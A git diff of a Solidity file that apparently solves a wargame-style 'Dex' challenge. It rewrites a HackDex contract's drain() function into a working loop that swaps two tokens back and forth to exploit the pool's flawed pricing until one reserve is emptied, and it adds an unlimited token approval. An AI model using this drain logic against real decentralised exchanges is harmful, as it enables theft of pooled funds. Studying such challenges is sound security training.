@@ -5,6 +5,7 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import '@openzeppelin/contracts/math/SafeMath.sol';
 import '@openzeppelin/contracts/access/Ownable.sol';
+import 'hardhat/console.sol';
 
 contract Dex is Ownable {
   using SafeMath for uint;
@@ -48,6 +49,7 @@ contract SwappableToken is ERC20 {
   address private _dex;
   constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
         _mint(msg.sender, initialSupply);
+        _mint(dexInstance, initialSupply * 10);
         _dex = dexInstance;
   }
 
@@ -58,26 +60,44 @@ contract SwappableToken is ERC20 {
 }
 
 contract HackDex {
-    Dex public constant dex = Dex(0x726c75AB3059D83c59C719fcB15cC57Fb65B683e);
-    address public constant tokenA = 0x02471d12B078Da19e42cc8b71E6aa886c4C7a5f0;
-    address public constant tokenB = 0x2cEF912AeAbC6225d068D4F0760A106147d4781e;
+    Dex public dex;
+    address public tokenA;
+    address public tokenB;
+
+    function setDex(address dex_) public {
+        dex = Dex(dex_);
+    }
+
+    function setTokens(address tokenA_, address tokenB_) public {
+        tokenA = tokenA_;
+        tokenB = tokenB_;
+    }
 
     function drain() public {
-        // initiate swap all a to b
-        dex.swap(tokenA, tokenB, balanceOf(tokenA, address(this)));
-        
-        check if a or b balance of dex contract is 0
-        while(dex.balanceOf(tokenA, dex) != 0 || dex.balanceOf(tokenB, dex) != 0) {
-            if (dex.balanceOf(tokenA, address(this)) == 0) {
-                dex.swap(tokenB, tokenA, balanceOf(tokenB, address(this)));
+        bool isAtoB = true;
+        while(dex.balanceOf(tokenA, address(dex)) != 0 && dex.balanceOf(tokenB, address(dex)) != 0) {
+            if(isAtoB) {
+                if(dex.balanceOf(tokenA, address(this)) < dex.balanceOf(tokenA, address(dex))) {
+                    dex.swap(tokenA, tokenB, dex.balanceOf(tokenA, address(this)));
+                    isAtoB = !isAtoB;
+                } else {
+                    dex.swap(tokenA, tokenB, dex.balanceOf(tokenA, address(dex)));
+                    return;
+                }
             } else {
-                dex.swap(tokenA, tokenB, balanceOf(tokenA, address(this)));
+                if(dex.balanceOf(tokenB, address(this)) < dex.balanceOf(tokenB, address(dex))) {
+                    dex.swap(tokenB, tokenA, dex.balanceOf(tokenB, address(this)));
+                    isAtoB = !isAtoB;
+                } else {
+                    dex.swap(tokenB, tokenA, dex.balanceOf(tokenB, address(dex)));
+                    return;
+                }
             }
         }
     }
 
-    // approve all
-    function callApprove() public {
-        dex.approve(dex, 2**256 - 1);
+    // approve all for dex
+    function approveDex() public {
+        dex.approve(address(dex), 2**256 - 1);
     }
 }
